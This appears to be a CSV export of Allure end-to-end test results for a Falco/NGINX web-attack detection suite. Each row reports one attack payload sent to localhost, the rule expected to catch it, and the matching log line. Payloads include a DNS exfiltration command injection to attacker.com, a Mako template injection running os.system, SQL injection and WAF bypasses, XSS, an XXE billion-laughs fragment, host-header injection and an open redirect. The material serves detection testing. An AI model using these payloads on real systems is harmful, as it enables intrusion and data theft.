"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_MULTI_001` |
| **Name** | CRLF double Host injection |
| **Category** | HOST_HEADER |
| **Subcategory** | multi_host |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `Host: good.com\r\nHost: evil.com`
- **Encoded**: `Host%3A%20good.com%0d%0aHost%3A%20evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 11:11:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_MULTI_001-1772277091929-mf0vwv pattern_id=HHI_MULTI_001 uri=/?q=Host%3A%20good.com%0d%0aHost%3A%20evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_MULTI_001-1772277091929-mf0vwv pattern_id=HHI_MULTI_001 uri=/?q=Host%3A%20good.com%0d%0aHost%3A%20evil.com client=127.0.0.1

**Falco Log Entry**:
```
11:11:31.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_MULTI_001-1772277091929-mf0vwv pattern_id=HHI_MULTI_001 uri=/?q=Host%3A%20good.com%0d%0aHost%3A%20evil.com client=127.0.0.1
```","2","test_e2e_with_logs[714_HHI_MULTI_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_005` |
| **Name** | Config file search and read via pipe |
| **Category** | CMDI |
| **Subcategory** | pipe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `find / -name '*.conf' | xargs cat`
- **Encoded**: `find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 11:10:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=CMD_PIPE_005-1772277053999-243tyr pattern_id=CMD_PIPE_005 uri=/?q=find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=CMD_PIPE_005-1772277053999-243tyr pattern_id=CMD_PIPE_005 uri=/?q=find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:53.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=CMD_PIPE_005-1772277053999-243tyr pattern_id=CMD_PIPE_005 uri=/?q=find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[383_CMD_PIPE_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_003` |
| **Name** | Base64 encoded whoami command |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `d2hvYW1p`
- **Encoded**: `d2hvYW1p`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[356_CMD_ENC_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_PORT_001` |
| **Name** | Port injection via Host |
| **Category** | HOST_HEADER |
| **Subcategory** | port_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `x-host:good.com:8443@evil.com`
- **Encoded**: `x-host%3Agood.com%3A8443%40evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 11:11:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_PORT_001-1772277092931-r8qvxt pattern_id=HHI_PORT_001 uri=/?q=x-host%3Agood.com%3A8443%40evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_PORT_001-1772277092931-r8qvxt pattern_id=HHI_PORT_001 uri=/?q=x-host%3Agood.com%3A8443%40evil.com client=127.0.0.1

**Falco Log Entry**:
```
11:11:32.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_PORT_001-1772277092931-r8qvxt pattern_id=HHI_PORT_001 uri=/?q=x-host%3Agood.com%3A8443%40evil.com client=127.0.0.1
```","2","test_e2e_with_logs[757_HHI_PORT_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `WAF_COMMENT_002` |
| **Name** | Inline comment SQL bypass |
| **Category** | WAF_BYPASS |
| **Subcategory** | sql_comment |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SEL/**/ECT * FROM users`
- **Encoded**: `SEL%2F%2A%2A%2FECT%20%2A%20FROM%20users`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~18000ms
- **Timestamp**: 11:11:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected` |
| **Matched Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_COMMENT_002-1772277101412-k0z4b pattern_id=WAF_COMMENT_002 uri=/?q=SEL%2F%2A%2A%2FECT%20%2A%20FROM%20users client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_COMMENT_002-1772277101412-k0z4b pattern_id=WAF_COMMENT_002 uri=/?q=SEL%2F%2A%2A%2FECT%20%2A%20FROM%20users client=127.0.0.1

**Falco Log Entry**:
```
11:11:41.000000000: Warning [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_COMMENT_002-1772277101412-k0z4b pattern_id=WAF_COMMENT_002 uri=/?q=SEL%2F%2A%2A%2FECT%20%2A%20FROM%20users client=127.0.0.1
```","2","test_e2e_with_logs[501_WAF_COMMENT_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_008` |
| **Name** | Textarea onfocus XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<textarea onfocus=alert('XSS') autofocus>`
- **Encoded**: `%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~111000ms
- **Timestamp**: 11:10:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1772277008417-16grwm pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1772277008417-16grwm pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:08.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1772277008417-16grwm pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[213_XSS_REFL_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `WAF_CASE_001` |
| **Name** | Mixed case SQL bypass |
| **Category** | WAF_BYPASS |
| **Subcategory** | case_variation |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `SeLeCt * FrOm users`
- **Encoded**: `SeLeCt%20%2A%20FrOm%20users`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~17000ms
- **Timestamp**: 11:11:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected` |
| **Matched Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_CASE_001-1772277102916-2n4rdk pattern_id=WAF_CASE_001 uri=/?q=SeLeCt%20%2A%20FrOm%20users client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_CASE_001-1772277102916-2n4rdk pattern_id=WAF_CASE_001 uri=/?q=SeLeCt%20%2A%20FrOm%20users client=127.0.0.1

**Falco Log Entry**:
```
11:11:42.000000000: Warning [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_CASE_001-1772277102916-2n4rdk pattern_id=WAF_CASE_001 uri=/?q=SeLeCt%20%2A%20FrOm%20users client=127.0.0.1
```","2","test_e2e_with_logs[476_WAF_CASE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BILLION_001` |
| **Name** | XXE billion laughs DoS attack |
| **Category** | XXE |
| **Subcategory** | entity_expansion |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!ENTITY lol ""lol""><!ENTITY lol2 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">`
- **Encoded**: `%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol2%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~87000ms
- **Timestamp**: 11:10:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BILLION_001-1772277032414-vlb8h pattern_id=XXE_BILLION_001 uri=/?q=%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol2%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BILLION_001-1772277032414-vlb8h pattern_id=XXE_BILLION_001 uri=/?q=%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol2%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E client=127.0.0.1

**Falco Log Entry**:
```
11:10:32.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BILLION_001-1772277032414-vlb8h pattern_id=XXE_BILLION_001 uri=/?q=%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol2%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E client=127.0.0.1
```","3","test_e2e_with_logs[442_XXE_BILLION_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_SSRF_001` |
| **Name** | X-Host SSRF via host header |
| **Category** | HOST_HEADER |
| **Subcategory** | ssrf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `X-Host: 127.0.0.1:8080`
- **Encoded**: `X-Host%3A%20127.0.0.1%3A8080`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 11:11:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_SSRF_001-1772277091427-h9mc2 pattern_id=HHI_SSRF_001 uri=/?q=X-Host%3A%20127.0.0.1%3A8080 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_SSRF_001-1772277091427-h9mc2 pattern_id=HHI_SSRF_001 uri=/?q=X-Host%3A%20127.0.0.1%3A8080 client=127.0.0.1

**Falco Log Entry**:
```
11:11:31.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_SSRF_001-1772277091427-h9mc2 pattern_id=HHI_SSRF_001 uri=/?q=X-Host%3A%20127.0.0.1%3A8080 client=127.0.0.1
```","2","test_e2e_with_logs[808_HHI_SSRF_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `REDIR_PROTO_001` |
| **Name** | Protocol-relative redirect via url param |
| **Category** | OPEN_REDIRECT |
| **Subcategory** | protocol_relative |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `url=//evil.com`
- **Encoded**: `url%3D%2F%2Fevil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 11:11:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Redirect] Open redirect attempt detected` |
| **Matched Rule** | `[NGINX Redirect] Open redirect attempt detected test_id=REDIR_PROTO_001-1772277096915-3ivu8m pattern_id=REDIR_PROTO_001 uri=/?q=url%3D%2F%2Fevil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Redirect] Open redirect attempt detected test_id=REDIR_PROTO_001-1772277096915-3ivu8m pattern_id=REDIR_PROTO_001 uri=/?q=url%3D%2F%2Fevil.com client=127.0.0.1

**Falco Log Entry**:
```
11:11:36.000000000: Warning [NGINX Redirect] Open redirect attempt detected test_id=REDIR_PROTO_001-1772277096915-3ivu8m pattern_id=REDIR_PROTO_001 uri=/?q=url%3D%2F%2Fevil.com client=127.0.0.1
```","2","test_e2e_with_logs[761_REDIR_PROTO_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_004` |
| **Name** | DNS-based data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; nslookup `whoami`.attacker.com`
- **Encoded**: `%3B%20nslookup%20%60whoami%60.attacker.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~91000ms
- **Timestamp**: 11:10:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1772277028943-qe33f5 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1772277028943-qe33f5 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1

**Falco Log Entry**:
```
11:10:28.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1772277028943-qe33f5 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
```","2","test_e2e_with_logs[352_CMD_BLIND_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_004` |
| **Name** | Alternative boolean condition |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR 'a'='a`
- **Encoded**: `%27%20OR%20%27a%27%3D%27a`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~111000ms
- **Timestamp**: 11:10:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1772277008934-li2j8 pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1772277008934-li2j8 pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:08.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1772277008934-li2j8 pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[040_SQLI_BOOL_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_MAKO_001` |
| **Name** | Mako Python execution |
| **Category** | SSTI |
| **Subcategory** | mako |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `${self.module.cache.util.os.system(""id"")}`
- **Encoded**: `%24%7Bself.module.cache.util.os.system(%22id%22)%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~70000ms
- **Timestamp**: 11:10:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_MAKO_001-1772277049921-3ifq4 pattern_id=SSTI_MAKO_001 uri=/?q=%24%7Bself.module.cache.util.os.system(%22id%22)%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_MAKO_001-1772277049921-3ifq4 pattern_id=SSTI_MAKO_001 uri=/?q=%24%7Bself.module.cache.util.os.system(%22id%22)%7D client=127.0.0.1

**Falco Log Entry**:
```
11:10:49.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_MAKO_001-1772277049921-3ifq4 pattern_id=SSTI_MAKO_001 uri=/?q=%24%7Bself.module.cache.util.os.system(%22id%22)%7D client=127.0.0.1
```","3","test_e2e_with_logs[689_SSTI_MAKO_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_RAWCL_001` |
| **Name** | Raw Content-Length Header |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | header_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Content-Length:0`
- **Encoded**: `Content-Length:0`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 11:11:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_RAWCL_001-1772277075923-xum3vg pattern_id=HRS_RAWCL_001 uri=/?q=Content-Length:0 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_RAWCL_001-1772277075923-xum3vg pattern_id=HRS_RAWCL_001 uri=/?q=Content-Length:0 client=127.0.0.1

**Falco Log Entry**:
```
11:11:15.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_RAWCL_001-1772277075923-xum3vg pattern_id=HRS_RAWCL_001 uri=/?q=Content-Length:0 client=127.0.0.1
```","2","test_e2e_with_logs[768_HRS_RAWCL_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_014` |
| **Name** | SUBSTRING function test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR SUBSTRING('test',1,1)='t' --`
- **Encoded**: `'%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~85000ms
- **Timestamp**: 11:10:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1772277034989-z4ntkc pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1772277034989-z4ntkc pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:34.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1772277034989-z4ntkc pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[050_SQLI_BOOL_014]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_011` |
| **Name** | Tabindex onfocus XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<div id=x tabindex=0 onfocus=alert(1)>`
- **Encoded**: `%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 11:10:48.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_011-1772277048008-ii8tv6 pattern_id=XSS_MUT_011 uri=/?q=%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_011-1772277048008-ii8tv6 pattern_id=XSS_MUT_011 uri=/?q=%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:48.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_011-1772277048008-ii8tv6 pattern_id=XSS_MUT_011 uri=/?q=%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[193_XSS_MUT_011]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_TOKEN_001` |
| **Name** | Access token with admin privilege |
| **Category** | API_SECURITY |
| **Subcategory** | token_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `access_token=eyJhbGciOi&admin=true`
- **Encoded**: `access_token%3DeyJhbGciOi%26admin%3Dtrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 11:11:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_TOKEN_001-1772277067940-2nt7kl pattern_id=API_TOKEN_001 uri=/?q=access_token%3DeyJhbGciOi%26admin%3Dtrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_TOKEN_001-1772277067940-2nt7kl pattern_id=API_TOKEN_001 uri=/?q=access_token%3DeyJhbGciOi%26admin%3Dtrue client=127.0.0.1

**Falco Log Entry**:
```
11:11:07.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_TOKEN_001-1772277067940-2nt7kl pattern_id=API_TOKEN_001 uri=/?q=access_token%3DeyJhbGciOi%26admin%3Dtrue client=127.0.0.1
```","2","test_e2e_with_logs[818_API_TOKEN_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
